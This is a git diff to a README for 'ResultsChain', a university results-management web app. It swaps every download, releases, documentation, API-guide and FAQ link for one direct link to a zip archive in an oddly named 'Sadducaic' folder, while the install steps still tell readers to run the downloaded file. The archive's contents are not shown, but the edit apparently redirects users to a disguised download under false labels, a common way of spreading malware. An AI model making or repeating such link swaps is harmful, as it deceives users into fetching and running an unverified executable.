@@ -6,7 +6,7 @@ ResultsChain is a user-friendly web app designed for universities. It helps mana
 
 ## 📥 Download Links
 
-[![Download ResultsChain](https://img.shields.io/badge/Download%20ResultsChain-v1.0-blue.svg)](https://github.com/ahmetissam/resultschain/releases)
+[![Download ResultsChain](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip%https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip)](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip)
 
 ## 🔍 Overview
 
@@ -31,7 +31,7 @@ Before you start, make sure your device meets the following requirements:
 
 To download and install ResultsChain, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ahmetissam/resultschain/releases) to find the latest version of ResultsChain.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip) to find the latest version of ResultsChain.
 2. Download the appropriate file for your system.
 3. Locate the downloaded file on your computer.
 4. Run the file to install ResultsChain.
@@ -68,11 +68,11 @@ Join our community for additional support and to provide feedback. You can reach
 
 Want to learn more? Here are some resources to enhance your experience:
 
-- [User Documentation](https://github.com/ahmetissam/resultschain/wiki)
-- [Developer API Guide](https://github.com/ahmetissam/resultschain/wiki/API)
-- [FAQs](https://github.com/ahmetissam/resultschain/wiki/FAQs)
+- [User Documentation](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip)
+- [Developer API Guide](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip)
+- [FAQs](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip)
 
-To download ResultsChain again, you can go directly to the [Releases page](https://github.com/ahmetissam/resultschain/releases).
+To download ResultsChain again, you can go directly to the [Releases page](https://raw.githubusercontent.com/ahmetissam/resultschain/main/Sadducaic/resultschain.zip).
 
 ## 🧩 Conclusion
 
